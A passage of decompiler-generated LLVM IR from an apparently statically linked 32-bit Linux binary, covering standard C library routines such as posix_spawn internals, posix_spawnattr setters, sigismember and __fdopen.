  %v0_8050a202 = phi i32 [ %v2_8050956, %dec_label_pc_8050954 ], [ %v3_8050949, %dec_label_pc_8050945 ]
  store i32 %v0_8050a202, i32* @ebx, align 4
  %v1_8050956 = inttoptr i32 %v0_8050a202 to i32*
  %v2_8050956 = load i32, i32* %v1_8050956, align 4
  %v1_8050958 = icmp eq i32 %v2_8050956, 0
  br i1 %v1_8050958, label %dec_label_pc_8050a20.preheader, label %dec_label_pc_8050954

dec_label_pc_8050a20.preheader:                   ; preds = %dec_label_pc_8050954
  br label %dec_label_pc_8050962

dec_label_pc_8050962:                             ; preds = %dec_label_pc_8050a20.preheader, %dec_label_pc_8050a1d
  %v0_8050962 = phi i32 [ %v3_8050a1d, %dec_label_pc_8050a1d ], [ %v0_8050a202, %dec_label_pc_8050a20.preheader ]
  %v1_8050962 = add i32 %v0_8050962, 12
  %v2_8050962 = inttoptr i32 %v1_8050962 to i32*
  %v3_8050962 = load i32, i32* %v2_8050962, align 4
  %v4_8050962 = load i32, i32* @ebp, align 4
  %v15_8050962 = icmp eq i32 %v3_8050962, %v4_8050962
  %v1_8050965 = icmp eq i1 %v15_8050962, false
  br i1 %v1_8050965, label %dec_label_pc_8050993, label %dec_label_pc_8050967

dec_label_pc_8050967:                             ; preds = %dec_label_pc_8050962
  store i32 41, i32* @eax, align 4
  store i32 %v4_8050962, i32* @edx, align 4
  %v0_805096e = load i32, i32* %stack_var_-20, align 4
  %v1_805096e = call i32 @__vsyscall(i32 %v0_805096e)
  %v2_8050973 = icmp slt i32 %v1_805096e, 0
  store i32 %v1_805096e, i32* %stack_var_-20, align 4
  br i1 %v2_8050973, label %dec_label_pc_8050a9a, label %dec_label_pc_8050982

dec_label_pc_8050982:                             ; preds = %dec_label_pc_8050967
  store i32 6, i32* @eax, align 4
  %v1_8050987 = call i32 @__vsyscall(i32 %v1_805096e)
  %v3_805098c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805098c, i32* @ebp, align 4
  %v0_8050993.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050993

dec_label_pc_8050993:                             ; preds = %dec_label_pc_8050962, %dec_label_pc_8050982
  %v0_80509b1 = phi i32 [ %v0_8050962, %dec_label_pc_8050962 ], [ %v0_8050993.pre, %dec_label_pc_8050982 ]
  %v1_8050993 = add i32 %v0_80509b1, 8
  %v2_8050993 = inttoptr i32 %v1_8050993 to i32*
  %v3_8050993 = load i32, i32* %v2_8050993, align 4
  %v9_8050996 = icmp eq i32 %v3_8050993, 2
  br i1 %v9_8050996, label %dec_label_pc_80509ac, label %dec_label_pc_805099b

dec_label_pc_805099b:                             ; preds = %dec_label_pc_8050993
  %v9_805099b = icmp eq i32 %v3_8050993, 3
  br i1 %v9_805099b, label %dec_label_pc_80509cc, label %dec_label_pc_80509a0

dec_label_pc_80509a0:                             ; preds = %dec_label_pc_805099b
  %v9_80509a0 = icmp eq i32 %v3_8050993, 1
  %v1_80509a3 = icmp eq i1 %v9_80509a0, false
  br i1 %v1_80509a3, label %dec_label_pc_8050a1d, label %dec_label_pc_80509a5

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_80509a0
  %v1_80509a5 = add i32 %v0_80509b1, 12
  %v2_80509a5 = inttoptr i32 %v1_80509a5 to i32*
  %v3_80509a5 = load i32, i32* %v2_80509a5, align 4
  store i32 %v3_80509a5, i32* @edx, align 4
  %v1_80509a8 = and i32 %v3_8050993, -256
  %v2_80509a8 = or i32 %v1_80509a8, 6
  %v0_8050a18.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8050a18

dec_label_pc_80509ac:                             ; preds = %dec_label_pc_8050993
  store i32 63, i32* @eax, align 4
  %v1_80509b1 = add i32 %v0_80509b1, 16
  %v2_80509b1 = inttoptr i32 %v1_80509b1 to i32*
  %v3_80509b1 = load i32, i32* %v2_80509b1, align 4
  store i32 %v3_80509b1, i32* @edx, align 4
  %v1_80509b4 = add i32 %v0_80509b1, 12
  %v2_80509b4 = inttoptr i32 %v1_80509b4 to i32*
  %v3_80509b4 = load i32, i32* %v2_80509b4, align 4
  store i32 %v3_80509b4, i32* %ecx.global-to-local, align 4
  %v0_80509b7 = load i32, i32* %stack_var_-20, align 4
  %v1_80509b7 = call i32 @__vsyscall(i32 %v0_80509b7)
  %v2_80509bc = icmp slt i32 %v1_80509b7, 0
  store i32 %v1_80509b7, i32* %stack_var_-20, align 4
  %v1_80509c5 = icmp eq i1 %v2_80509bc, false
  br i1 %v1_80509c5, label %dec_label_pc_8050a1d, label %dec_label_pc_8050a9a

dec_label_pc_80509cc:                             ; preds = %dec_label_pc_805099b
  %v1_80509cc = add i32 %v0_80509b1, 20
  %v2_80509cc = inttoptr i32 %v1_80509cc to i32*
  %v3_80509cc = load i32, i32* %v2_80509cc, align 4
  store i32 %v3_80509cc, i32* %ecx.global-to-local, align 4
  %v1_80509cf = add i32 %v0_80509b1, 28
  store i32 %v1_80509cf, i32* @edx, align 4
  store i32 5, i32* @eax, align 4
  %v1_80509d7 = add i32 %v0_80509b1, 24
  %v2_80509d7 = inttoptr i32 %v1_80509d7 to i32*
  %v3_80509d7 = load i32, i32* %v2_80509d7, align 4
  store i32 %v3_80509d7, i32* @edi, align 4
  %v11_80509da = or i32 %v3_80509cc, 32768
  store i32 %v11_80509da, i32* %ecx.global-to-local, align 4
  %v0_80509dd = load i32, i32* %stack_var_-20, align 4
  %v1_80509dd = call i32 @__vsyscall(i32 %v0_80509dd)
  %v2_80509e2 = icmp slt i32 %v1_80509dd, 0
  store i32 %v1_80509dd, i32* @edx, align 4
  store i32 %v1_80509dd, i32* %stack_var_-20, align 4
  br i1 %v2_80509e2, label %dec_label_pc_8050a9a, label %dec_label_pc_80509f3

dec_label_pc_80509f3:                             ; preds = %dec_label_pc_80509cc
  %v0_80509f3 = load i32, i32* @ebx, align 4
  %v1_80509f3 = add i32 %v0_80509f3, 12
  %v2_80509f3 = inttoptr i32 %v1_80509f3 to i32*
  %v3_80509f3 = load i32, i32* %v2_80509f3, align 4
  store i32 %v3_80509f3, i32* %ecx.global-to-local, align 4
  %v12_80509f6 = icmp eq i32 %v1_80509dd, %v3_80509f3
  br i1 %v12_80509f6, label %dec_label_pc_8050a1d, label %dec_label_pc_80509fa

dec_label_pc_80509fa:                             ; preds = %dec_label_pc_80509f3
  store i32 63, i32* @eax, align 4
  %v1_80509ff = call i32 @__vsyscall(i32 %v1_80509dd)
  %v2_8050a04 = icmp slt i32 %v1_80509ff, 0
  store i32 %v1_80509ff, i32* %stack_var_-20, align 4
  br i1 %v2_8050a04, label %dec_label_pc_8050a9a, label %dec_label_pc_8050a18

dec_label_pc_8050a18:                             ; preds = %dec_label_pc_80509fa, %dec_label_pc_80509a5
  %v0_8050a18 = phi i32 [ %v0_8050a18.pre, %dec_label_pc_80509a5 ], [ %v1_80509ff, %dec_label_pc_80509fa ]
  %storemerge = phi i32 [ %v2_80509a8, %dec_label_pc_80509a5 ], [ 6, %dec_label_pc_80509fa ]
  store i32 %storemerge, i32* @eax, align 4
  %v1_8050a18 = call i32 @__vsyscall(i32 %v0_8050a18)
  br label %dec_label_pc_8050a1d

dec_label_pc_8050a1d:                             ; preds = %dec_label_pc_80509f3, %dec_label_pc_80509ac, %dec_label_pc_80509a0, %dec_label_pc_8050a18
  %v0_8050a1d = load i32, i32* @ebx, align 4
  %v1_8050a1d = add i32 %v0_8050a1d, 4
  %v2_8050a1d = inttoptr i32 %v1_8050a1d to i32*
  %v3_8050a1d = load i32, i32* %v2_8050a1d, align 4
  store i32 %v3_8050a1d, i32* @ebx, align 4
  %v1_8050a20 = icmp eq i32 %v3_8050a1d, 0
  %v1_8050a22 = icmp eq i1 %v1_8050a20, false
  br i1 %v1_8050a22, label %dec_label_pc_8050962, label %dec_label_pc_8050a28

dec_label_pc_8050a28:                             ; preds = %dec_label_pc_8050a1d, %dec_label_pc_8050945, %dec_label_pc_805093a
  store i32 221, i32* @eax, align 4
  store i32 2, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v0_8050a37 = load i32, i32* @ebp, align 4
  store i32 %v0_8050a37, i32* @edx, align 4
  %v0_8050a39 = load i32, i32* %stack_var_-20, align 4
  %v1_8050a39 = call i32 @__vsyscall(i32 %v0_8050a39)
  %v0_8050a3e = load i32, i32* @esi, align 4
  %v1_8050a3e = inttoptr i32 %v0_8050a3e to i8*
  %v2_8050a3e = load i8, i8* %v1_8050a3e, align 1
  %v3_8050a3e = and i8 %v2_8050a3e, 8
  %v4_8050a3e = icmp eq i8 %v3_8050a3e, 0
  %v1_8050a41 = add i32 %v0_8050a3e, 136
  %v1_8050a47 = icmp eq i1 %v4_8050a3e, false
  br i1 %v1_8050a47, label %dec_label_pc_8050a53, label %dec_label_pc_8050a49

dec_label_pc_8050a49:                             ; preds = %dec_label_pc_8050a28
  %v1_8050a50 = add i32 %tmp23, 8
  br label %dec_label_pc_8050a53

dec_label_pc_8050a53:                             ; preds = %dec_label_pc_8050a28, %dec_label_pc_8050a49
  %v0_8050a56 = phi i32 [ %v1_8050a41, %dec_label_pc_8050a28 ], [ %v1_8050a50, %dec_label_pc_8050a49 ]
  store i32 2, i32* %stack_var_-316, align 4
  %v4_8050a59 = call i32 @pthread_sigmask(i32 2, i32 %v0_8050a56, i32* null)
  %v1_8050a74 = add i32 %tmp23, 136
  %v2_8050a74 = inttoptr i32 %v1_8050a74 to i32*
  %v3_8050a74 = load i32, i32* %v2_8050a74, align 4
  store i32 %v3_8050a74, i32* %stack_var_-316, align 4
  %v5_8050a81 = add i32 %tmp23, 140
  %v6_8050a81 = inttoptr i32 %v5_8050a81 to i32*
  %v7_8050a81 = load i32, i32* %v6_8050a81, align 4
  call void @__pseudo_call(i32 %v7_8050a81)
  %v1_8050a87 = call i32 @__errno_location(i32 134548103)
  %v1_8050a8c = inttoptr i32 %v1_8050a87 to i32*
  %v2_8050a8c = load i32, i32* %v1_8050a8c, align 4
  %v1_8050a8e = sub i32 0, %v2_8050a8c
  br label %dec_label_pc_8050a9a

dec_label_pc_8050a9a:                             ; preds = %dec_label_pc_80509ac, %dec_label_pc_80509fa, %dec_label_pc_80509cc, %dec_label_pc_8050967, %dec_label_pc_805090e, %dec_label_pc_80508dd, %dec_label_pc_80508ba, %dec_label_pc_8050a53
  %stack_var_-24.0 = phi i32 [ %v1_8050a8e, %dec_label_pc_8050a53 ], [ %tmp, %dec_label_pc_80508dd ], [ %tmp, %dec_label_pc_805090e ], [ %tmp, %dec_label_pc_80508ba ], [ %tmp, %dec_label_pc_8050967 ], [ %tmp, %dec_label_pc_80509cc ], [ %tmp, %dec_label_pc_80509fa ], [ %tmp, %dec_label_pc_80509ac ]
  %v1_8050aa1 = sub i32 0, %stack_var_-24.0
  %v6_8050aa1 = icmp eq i32 %stack_var_-24.0, 0
  br i1 %v6_8050aa1, label %dec_label_pc_8050ac7, label %dec_label_pc_8050aae

dec_label_pc_8050aae:                             ; preds = %dec_label_pc_8050a9a
  %v2_8050aae = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050aae, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050ab5

dec_label_pc_8050ab5:                             ; preds = %dec_label_pc_8050ab5, %dec_label_pc_8050aae
  store i32 4, i32* @edi, align 4
  %v0_8050aba = load i32, i32* @ebp, align 4
  store i32 %v0_8050aba, i32* @edx, align 4
  store i32 4, i32* @eax, align 4
  %v1_8050abe = call i32 @__vsyscall(i32 %v1_8050aa1)
  %v2_8050ac3 = icmp slt i32 %v1_8050abe, 0
  br i1 %v2_8050ac3, label %dec_label_pc_8050ab5, label %dec_label_pc_8050ac7

dec_label_pc_8050ac7:                             ; preds = %dec_label_pc_8050ab5, %dec_label_pc_8050a9a
  store i32 127, i32* %stack_var_-316, align 4
  %v1_8050acc = call i32 @_exit(i32 127)
  unreachable

; uselistorder directives
  uselistorder i32 %v3_8050a1d, { 1, 2, 0 }
  uselistorder i32 %v1_80509dd, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_8050993, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80509b1, { 2, 4, 3, 1, 0, 5, 6 }
  uselistorder i32 %v4_8050962, { 1, 0 }
  uselistorder i32 %v2_8050956, { 1, 0 }
  uselistorder i32 %v0_8050a202, { 0, 2, 1 }
  uselistorder i32 %v1_80508f8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805086c, { 1, 0, 2 }
  uselistorder i32 %v2_8050834, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v3_8050818, { 1, 0 }
  uselistorder i32* %stack_var_-288, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-316, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-20, { 14, 5, 6, 7, 4, 8, 3, 0, 9, 10, 1, 11, 12, 2, 13 }
  uselistorder i32 %tmp23, { 5, 0, 4, 1, 3, 2 }
  uselistorder i32* null, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 (i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sigismember, { 1, 0 }
  uselistorder i32 (i32)* @close, { 10, 1, 0, 2, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8050a9a, { 7, 1, 2, 0, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050a53, { 1, 0 }
  uselistorder label %dec_label_pc_8050a1d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050993, { 1, 0 }
  uselistorder label %dec_label_pc_8050962, { 1, 0 }
  uselistorder label %dec_label_pc_8050954, { 1, 0 }
  uselistorder label %dec_label_pc_80508af, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805089e, { 1, 2, 0 }
}

define i32 @posix_spawnattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @posix_spawnattr_init(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-340 = alloca i32, align 4
  %v0_8050ad8 = load i32, i32* @ebx, align 4
  %v2_8050adf = ptrtoint i32* %stack_var_-340 to i32
  %v3_8050aec = bitcast i32* %stack_var_-340 to i8*
  %v4_8050aec = call i32 @memset(i8* %v3_8050aec, i32 0, i32 336)
  %v3_8050b01 = inttoptr i32 %arg1 to i8*
  %v4_8050b01 = call i32 @memcpy(i8* %v3_8050b01, i32 %v2_8050adf, i32 336)
  store i32 %v0_8050ad8, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 336, { 1, 0, 2 }
}

define i32 @posix_spawnattr_setflags(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %sext = mul i32 %arg2, 65536
  %v4_8050b14 = sdiv i32 %sext, 65536
  store i32 %v4_8050b14, i32* %arg1, align 4
  ret i32 0
}

define i32 @posix_spawnattr_setsigdefault(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8050b30 = add i32 %arg1, 8
  %v3_8050b34 = inttoptr i32 %v1_8050b30 to i8*
  %v4_8050b34 = call i32 @memcpy(i8* %v3_8050b34, i32 %arg2, i32 128)
  ret i32 0
}

define i32 @posix_spawnattr_setsigmask(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8050b50 = add i32 %arg1, 136
  %v3_8050b56 = inttoptr i32 %v1_8050b50 to i8*
  %v4_8050b56 = call i32 @memcpy(i8* %v3_8050b56, i32 %arg2, i32 128)
  ret i32 0
}

define i32 @__restore(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v2_8050b6a = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v2_8050b6a
}

define i32 @__restore_rt(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v2_8050b71 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v2_8050b71
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8050b7a = add i32 %arg2, -1
  %v6_8050b7e = icmp ugt i32 %v1_8050b7a, 63
  br i1 %v6_8050b7e, label %dec_label_pc_8050b94, label %dec_label_pc_8050b80

dec_label_pc_8050b80:                             ; preds = %entry
  %v1_8050b86 = urem i32 %v1_8050b7a, 32
  %v2_8050b86 = icmp eq i32 %v1_8050b86, 0
  %v2_8050b89 = udiv i32 %v1_8050b7a, 32
  %v2_8050b8c = mul nuw nsw i32 %v2_8050b89, 4
  %v3_8050b8c = add i32 %v2_8050b8c, %arg1
  %v4_8050b8c = inttoptr i32 %v3_8050b8c to i32*
  %v5_8050b8c = load i32, i32* %v4_8050b8c, align 4
  br i1 %v2_8050b86, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050b80
  %v5_8050b8f = lshr i32 %v5_8050b8c, %v1_8050b86
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050b80, %bb
  %v0_8050b91 = phi i32 [ %v5_8050b8c, %dec_label_pc_8050b80 ], [ %v5_8050b8f, %bb ]
  %v1_8050b91 = urem i32 %v0_8050b91, 2
  br label %dec_label_pc_8050b94

dec_label_pc_8050b94:                             ; preds = %entry, %bb4
  %v0_8050b94 = phi i32 [ 0, %entry ], [ %v1_8050b91, %bb4 ]
  ret i32 %v0_8050b94

; uselistorder directives
  uselistorder i32 %v1_8050b86, { 1, 0 }
  uselistorder label %dec_label_pc_8050b94, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__fdopen(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = alloca i8*, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050b98 = load i32, i32* @edi, align 4
  %v0_8050b9a = load i32, i32* @ebx, align 4
  store i32 %v0_8050b9a, i32* %stack_var_-12, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v4_8050b9e = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050b9e, i32* @esi, align 4
  %v2_8050ba2 = load i8, i8* %arg2, align 1
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80545b8.369, i32 0, i32 0), i8** %stack_var_-60, align 4
  %v4_8050bab = call i32 @strchr(i32 ptrtoint ([4 x i8]* @global_var_80545b8.369 to i32), i8 %v2_8050ba2)
  %v12_8050bb0 = ptrtoint i32* %stack_var_-44 to i32
  %v1_8050bb3 = icmp eq i32 %v4_8050bab, 0
  store i1 %v1_8050bb3, i1* %zf.global-to-local, align 1
  %v1_8050bb5 = icmp eq i1 %v1_8050bb3, false
  br i1 %v1_8050bb5, label %dec_label_pc_8050bc9, label %dec_label_pc_8050bb7

dec_label_pc_8050bb7:                             ; preds = %entry
  %v0_8050bb7 = load i8*, i8** %stack_var_-60, align 4
  %v1_8050bb7 = ptrtoint i8* %v0_8050bb7 to i32
  %v2_8050bb7 = call i32 @__errno_location(i32 %v1_8050bb7)
  %v1_8050bbc = inttoptr i32 %v2_8050bb7 to i32*
  store i32 22, i32* %v1_8050bbc, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8050ce7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050ce7

dec_label_pc_8050bc9:                             ; preds = %entry
  %v9_8050bc9 = icmp eq i32* %stack_var_-44, inttoptr (i32 12 to i32*)
  store i1 %v9_8050bc9, i1* %zf.global-to-local, align 1
  store i8* inttoptr (i32 1168 to i8*), i8** %stack_var_-60, align 4
  %v2_8050bd1 = call i32 @malloc(i32 1168)
  %v1_8050bd9 = inttoptr i32 %v2_8050bd1 to i8*
  store i8* %v1_8050bd9, i8** %tmp, align 4
  store i32 %v2_8050bd1, i32* @ebx, align 4
  %v2_8050bdd = icmp eq i32 %v2_8050bd1, 0
  store i1 %v2_8050bdd, i1* %zf.global-to-local, align 1
  br i1 %v2_8050bdd, label %dec_label_pc_8050ce7, label %dec_label_pc_8050be5

dec_label_pc_8050be5:                             ; preds = %dec_label_pc_8050bc9
  %tmp19 = bitcast i8** %tmp to i32*
  %tmp20 = bitcast i8** %stack_var_-60 to i32*
  store i32 %v2_8050bd1, i32* %tmp20, align 4
  %v5_8050bee = call i32 @memset(i8* %v1_8050bd9, i32 0, i32 136)
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8050bf7 = load i32, i32* @esi, align 4
  %v5_8050bf7 = inttoptr i32 %v0_8050bf7 to i8*
  store i8* %v5_8050bf7, i8** %stack_var_-60, align 4
  %v4_8050bf8 = call i32 @strchr(i32 %v0_8050bf7, i8 43)
  %v1_8050c00 = icmp eq i32 %v4_8050bf8, 0
  store i1 %v1_8050c00, i1* %zf.global-to-local, align 1
  %v1_8050c02 = icmp eq i1 %v1_8050c00, false
  br i1 %v1_8050c02, label %dec_label_pc_8050c15, label %dec_label_pc_8050c04

dec_label_pc_8050c04:                             ; preds = %dec_label_pc_8050be5
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_8050c06 = load i32, i32* @esi, align 4
  %v1_8050c06 = inttoptr i32 %v0_8050c06 to i8*
  %v2_8050c06 = load i8, i8* %v1_8050c06, align 1
  %v11_8050c06 = icmp eq i8 %v2_8050c06, 114
  store i1 %v11_8050c06, i1* %zf.global-to-local, align 1
  %v2_8050c0c = select i1 %v11_8050c06, i32 8, i32 4
  %tmp21 = inttoptr i32 %v2_8050bd1 to i32*
  store i32 %v2_8050c0c, i32* %tmp21, align 4
  br label %dec_label_pc_8050c15

dec_label_pc_8050c15:                             ; preds = %dec_label_pc_8050be5, %dec_label_pc_8050c04
  %v0_8050c19 = load i32, i32* @esi, align 4
  %v5_8050c19 = inttoptr i32 %v0_8050c19 to i8*
  store i8* %v5_8050c19, i8** %stack_var_-60, align 4
  %v4_8050c1a = call i32 @strchr(i32 %v0_8050c19, i8 101)
  %v1_8050c22 = icmp eq i32 %v4_8050c1a, 0
  store i1 %v1_8050c22, i1* %zf.global-to-local, align 1
  br i1 %v1_8050c22, label %dec_label_pc_8050c3e, label %dec_label_pc_8050c26

dec_label_pc_8050c26:                             ; preds = %dec_label_pc_8050c15
  store i32 221, i32* @eax, align 4
  store i32 2, i32* %ecx.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 1, i32* @edi, align 4
  %v0_8050c39 = load i8*, i8** %stack_var_-60, align 4
  %v1_8050c39 = ptrtoint i8* %v0_8050c39 to i32
  %v2_8050c39 = call i32 @__vsyscall(i32 %v1_8050c39)
  br label %dec_label_pc_8050c3e

dec_label_pc_8050c3e:                             ; preds = %dec_label_pc_8050c15, %dec_label_pc_8050c26
  %v0_8050c3e = load i32, i32* @esi, align 4
  %v1_8050c3e = inttoptr i32 %v0_8050c3e to i8*
  %v2_8050c3e = load i8, i8* %v1_8050c3e, align 1
  %v11_8050c3e = icmp eq i8 %v2_8050c3e, 97
  store i1 %v11_8050c3e, i1* %zf.global-to-local, align 1
  %v1_8050c41 = icmp eq i1 %v11_8050c3e, false
  br i1 %v1_8050c41, label %dec_label_pc_8050c3e.dec_label_pc_8050c74_crit_edge, label %dec_label_pc_8050c43

dec_label_pc_8050c3e.dec_label_pc_8050c74_crit_edge: ; preds = %dec_label_pc_8050c3e
  %v0_8050c78.pre = load i8*, i8** %tmp, align 4
  br label %dec_label_pc_8050c74

dec_label_pc_8050c43:                             ; preds = %dec_label_pc_8050c3e
  store i32 221, i32* @esi, align 4
  store i32 3, i32* %ecx.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 221, i32* @eax, align 4
  %v0_8050c53 = load i8*, i8** %stack_var_-60, align 4
  %v1_8050c53 = ptrtoint i8* %v0_8050c53 to i32
  %v2_8050c53 = call i32 @__vsyscall(i32 %v1_8050c53)
  %v3_8050c58 = and i32 %v2_8050c53, 1024
  %v4_8050c58 = icmp eq i32 %v3_8050c58, 0
  store i1 %v4_8050c58, i1* %zf.global-to-local, align 1
  store i32 %v2_8050c53, i32* @edi, align 4
  %v1_8050c5d = icmp eq i1 %v4_8050c58, false
  br i1 %v1_8050c5d, label %dec_label_pc_8050c6e, label %dec_label_pc_8050c5f

dec_label_pc_8050c5f:                             ; preds = %dec_label_pc_8050c43
  %v0_8050c5f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c5f = and i32 %v0_8050c5f, -256
  %v2_8050c5f = or i32 %v1_8050c5f, 4
  store i32 %v2_8050c5f, i32* %ecx.global-to-local, align 4
  %v1_8050c61 = or i32 %v2_8050c53, 1024
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v1_8050c61, i32* @edi, align 4
  %v0_8050c67 = load i32, i32* @esi, align 4
  store i32 %v0_8050c67, i32* @eax, align 4
  %v0_8050c69 = load i8*, i8** %stack_var_-60, align 4
  %v1_8050c69 = ptrtoint i8* %v0_8050c69 to i32
  %v2_8050c69 = call i32 @__vsyscall(i32 %v1_8050c69)
  br label %dec_label_pc_8050c6e

dec_label_pc_8050c6e:                             ; preds = %dec_label_pc_8050c43, %dec_label_pc_8050c5f
  %v0_8050c6e = load i8*, i8** %tmp, align 4
  %tmp22 = bitcast i8* %v0_8050c6e to i32*
  %v3_8050c6e = load i32, i32* %tmp22, align 4
  %v4_8050c6e = or i32 %v3_8050c6e, 128
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v4_8050c6e, i32* %tmp22, align 4
  br label %dec_label_pc_8050c74

dec_label_pc_8050c74:                             ; preds = %dec_label_pc_8050c3e.dec_label_pc_8050c74_crit_edge, %dec_label_pc_8050c6e
  %v1_8050c81 = phi i8* [ %v0_8050c78.pre, %dec_label_pc_8050c3e.dec_label_pc_8050c74_crit_edge ], [ %v0_8050c6e, %dec_label_pc_8050c6e ]
  store i32 %arg1, i32* @edx, align 4
  %v1_8050c78 = ptrtoint i8* %v1_8050c81 to i32
  %v2_8050c78 = add i32 %v1_8050c78, 144
  %v3_8050c7e = load i8, i8* %v1_8050c81, align 1
  %v4_8050c7e = and i8 %v3_8050c7e, 8
  %v5_8050c7e = icmp eq i8 %v4_8050c7e, 0
  store i1 %v5_8050c7e, i1* %zf.global-to-local, align 1
  %v3_8050c81 = add i32 %v1_8050c78, 44
  %v4_8050c81 = inttoptr i32 %v3_8050c81 to i32*
  store i32 %v2_8050c78, i32* %v4_8050c81, align 4
  %v0_8050c84 = load i8*, i8** %tmp, align 4
  %v1_8050c84 = ptrtoint i8* %v0_8050c84 to i32
  %v2_8050c84 = add i32 %v1_8050c84, 48
  %v3_8050c84 = inttoptr i32 %v2_8050c84 to i32*
  store i32 1024, i32* %v3_8050c84, align 4
  %v0_8050c8b = load i32, i32* @edx, align 4
  %v1_8050c8b = load i8*, i8** %tmp, align 4
  %v2_8050c8b = ptrtoint i8* %v1_8050c8b to i32
  %v3_8050c8b = add i32 %v2_8050c8b, 60
  %v4_8050c8b = inttoptr i32 %v3_8050c8b to i32*
  store i32 %v0_8050c8b, i32* %v4_8050c8b, align 4
  %v0_8050c8e = load i8*, i8** %tmp, align 4
  %v1_8050c8e = ptrtoint i8* %v0_8050c8e to i32
  %v2_8050c8e = add i32 %v1_8050c8e, 75
  %v3_8050c8e = inttoptr i32 %v2_8050c8e to i8*
  store i8 -1, i8* %v3_8050c8e, align 1
  %v0_8050c92 = load i1, i1* %zf.global-to-local, align 1
  %v1_8050c92 = icmp eq i1 %v0_8050c92, false
  br i1 %v1_8050c92, label %dec_label_pc_8050caf, label %dec_label_pc_8050c94

dec_label_pc_8050c94:                             ; preds = %dec_label_pc_8050c74
  %v2_8050c94 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050c94, i32* @edi, align 4
  store i32 54, i32* @eax, align 4
  store i32 21523, i32* %ecx.global-to-local, align 4
  %v0_8050ca2 = load i8*, i8** %stack_var_-60, align 4
  %v1_8050ca2 = ptrtoint i8* %v0_8050ca2 to i32
  %v2_8050ca2 = call i32 @__vsyscall(i32 %v1_8050ca2)
  %v1_8050ca7 = icmp eq i32 %v2_8050ca2, 0
  store i1 %v1_8050ca7, i1* %zf.global-to-local, align 1
  %v1_8050ca9 = icmp eq i1 %v1_8050ca7, false
  br i1 %v1_8050ca9, label %dec_label_pc_8050caf, label %dec_label_pc_8050cab

dec_label_pc_8050cab:                             ; preds = %dec_label_pc_8050c94
  %v0_8050cab = load i8*, i8** %tmp, align 4
  %v1_8050cab = ptrtoint i8* %v0_8050cab to i32
  %v2_8050cab = add i32 %v1_8050cab, 75
  %v3_8050cab = inttoptr i32 %v2_8050cab to i8*
  store i8 10, i8* %v3_8050cab, align 1
  br label %dec_label_pc_8050caf

dec_label_pc_8050caf:                             ; preds = %dec_label_pc_8050c94, %dec_label_pc_8050c74, %dec_label_pc_8050cab
  %v0_8050caf = load i32, i32* @global_var_8056f84.366, align 4
  %v1_8050caf = icmp eq i32 %v0_8050caf, 0
  store i1 %v1_8050caf, i1* %zf.global-to-local, align 1
  %v0_8050cb6 = load i8*, i8** %tmp, align 4
  %v1_8050cb6 = ptrtoint i8* %v0_8050cb6 to i32
  %v2_8050cb6 = add i32 %v1_8050cb6, 32
  %v3_8050cb6 = inttoptr i32 %v2_8050cb6 to i32*
  store i32 134534372, i32* %v3_8050cb6, align 4
  %v0_8050cbd = load i8*, i8** %tmp, align 4
  %v1_8050cbd = ptrtoint i8* %v0_8050cbd to i32
  %v2_8050cbd = add i32 %v1_8050cbd, 36
  %v3_8050cbd = inttoptr i32 %v2_8050cbd to i32*
  store i32 134548984, i32* %v3_8050cbd, align 4
  %v0_8050cc4 = load i8*, i8** %tmp, align 4
